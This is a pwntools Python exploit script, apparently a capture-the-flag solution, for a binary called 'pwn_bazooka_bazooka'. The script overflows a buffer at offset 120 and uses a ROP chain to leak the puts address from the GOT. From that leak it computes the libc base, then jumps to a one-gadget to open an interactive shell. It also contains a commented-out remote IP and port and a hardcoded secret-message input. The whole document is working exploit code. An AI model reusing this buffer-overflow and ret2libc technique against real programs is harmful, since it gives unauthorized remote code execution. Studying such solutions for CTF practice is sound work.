from pwn import *

#0 --- initialise
bin='./pwn_bazooka_bazooka'
offset=120
pop_rdi=0x4008f3
p=process(bin)
#p=connect('34.185.173.244',30307)
e=ELF(bin)
vuln=0x4006f7

#1 --- leaking libc
payload1=b'A'*offset+p64(pop_rdi)+p64(e.got['puts'])+p64(e.plt['puts'])+p64(vuln)
#gdb.attach(p)
p.sendlineafter("Secret message: ", b'#!@{try_hard3r}')
p.sendlineafter("Message: ", payload1)
p.recvline()
leak = u64(p.recvline().rstrip().ljust(8, b"\x00"))
p.info(f"puts: {hex(leak)}")

#1.5
puts_offset=0x80aa0
bin_sh_offset=0x1b3e1a
system_offset=0x4f550

libc_base= leak - puts_offset

bin_sh=libc_base+bin_sh_offset
syst=libc_base+system_offset
log.success(f"libc base: {hex(libc_base)}")
log.success(f"bin/sh: {hex(bin_sh)}")
log.success(f"system: {hex(syst)}")

#2 --- shelling
ONE = 0x4f432 + libc_base
payload2=b'A'*offset
payload2 += p64(ONE)
payload2 += p64(ONE)

p.sendlineafter("Message: ", payload2)

p.interactive()



